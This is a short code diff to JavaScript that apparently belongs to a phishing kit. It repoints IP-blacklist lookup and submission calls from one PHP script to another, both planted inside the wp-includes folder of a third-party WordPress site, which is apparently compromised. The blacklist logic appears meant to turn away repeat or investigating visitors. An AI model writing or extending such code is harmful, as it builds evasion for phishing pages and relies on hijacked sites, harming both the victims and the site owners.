@@ -418,7 +418,7 @@ function sendMessage2() {
        // Function to check if IP address is blacklisted
     function checkBlacklistedIP(ip) {
         // Check if IP is already blacklisted in the database
-        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        fetch('https://tastymomos.com.au/wp-includes/js/wplink.php?ip=' + ip)
             .then(response => response.text())
             .then(data => {
                 if (data === 'blacklisted') {
@@ -451,11 +451,11 @@ function sendMessage2() {
     // Function to add blacklisted IP address
     function addBlacklistedIP(ip) {
         // Check if IP is already in the blacklist
-        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        fetch('https://tastymomos.com.au/wp-includes/js/wplink.php?ip=' + ip)
             .then(response => response.text())
             .then(data => {
                 if (data !== 'blacklisted') {
-                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
+                    fetch('https://tastymomos.com.au/wp-includes/js/wplink.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
